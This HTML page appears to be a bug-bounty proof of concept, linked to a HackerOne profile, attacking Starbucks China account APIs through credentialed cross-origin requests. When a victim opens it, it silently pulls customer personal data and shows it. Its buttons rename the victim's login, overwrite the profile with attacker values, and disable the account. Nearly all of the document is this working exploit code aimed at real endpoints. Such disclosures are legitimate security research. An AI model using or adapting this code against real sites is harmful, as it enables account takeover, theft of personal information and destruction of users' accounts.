<!DOCTYPE html>
<html>
<head>
<meta name="referrer" content="never">
<script src=/jquery-3.4.1.min.js></script>
</head>
<title>steal the informations</title>
<div>
Attention!the loggin userName can be modified only once,click the button.
<button id="modifyuserName" onclick="modifyUserName()">Modify the loggin name of starbucks's account</button>
</div>
</br>
</br>
<div>
click the button to modify the profile of victim's account!
<button id="modifyProfile" onclick="modifyProfile()">modify the Profile of starbucks's account</button>
</div>
<div text="steal customer's personal informaiton">
steal customer's personal address
<textarea id="customer" style="width: 200px; height: 150px;"></textarea>
</div>
</br>
</br>
</br>
<div>
Attention!click the button will lead your account disabled.
<button id="disable" onclick="disable()">Disable the starbucks's account</button>
</div>
<script>

     var xmlhttp1 = new XMLHttpRequest()
     xmlhttp1.onreadystatechange=function()
	{
		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
		{
			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
			console.log("Success");
		}
	}
    	
	xmlhttp1.open("GET","https://zhixuelong.com/teachers/profile",true);
	xmlhttp1.withCredentials = true;
	xmlhttp1.send();
	
	function modifyUserName(){
		var data = {};
		data["userName"] = "AttackerJohn";
		$.ajax({
			    url : 'https://profile.starbucks.com.cn/api/account/username',
			    type : 'PATCH',
			    dataType:'json',
			    contentType:'application/json',
			    data:JSON.stringify(data),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(response, textStatus, jqXhr) {
				alert("Successfully !Your account's loggin userName have been modified!");
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				// log the error to the console
				console.log("The following error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				console.log("complete");
			    }
        });
	}
	
		
	function modifyProfile(){
		var data = {};
		data["firstName"] = "attackerFirstName";
		data["lastName"] = "attackerlastName";
		data["gender"] = "Male";
		$.ajax({
			    url : 'https://profile.starbucks.com.cn/api/Customers/update/patch',
			    type : 'POST',
			    dataType:'json',
			    contentType:'application/json',
			    data:JSON.stringify(data),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(response, textStatus, jqXhr) {
				alert("Successfully !Your account's profile have been modified!");
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				// log the error to the console
				console.log("The following error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				console.log("complete");
			    }
        });
	}
	
	function disable(){
		var data = {};
		data["reason1"] = "Customer closed account";
		$.ajax({
			    url : 'https://profile.starbucks.com.cn/api/Customers/disable',
			    type : 'POST',
			    dataType:'json',
			    contentType:'application/json',
			    data:JSON.stringify(data),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(response, textStatus, jqXhr) {
				alert("Successfully !Your account's was disabled");
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				// log the error to the console
				console.log("The following error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				console.log("complete");
			    }
        });
	}
	
</script>
<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
</html>
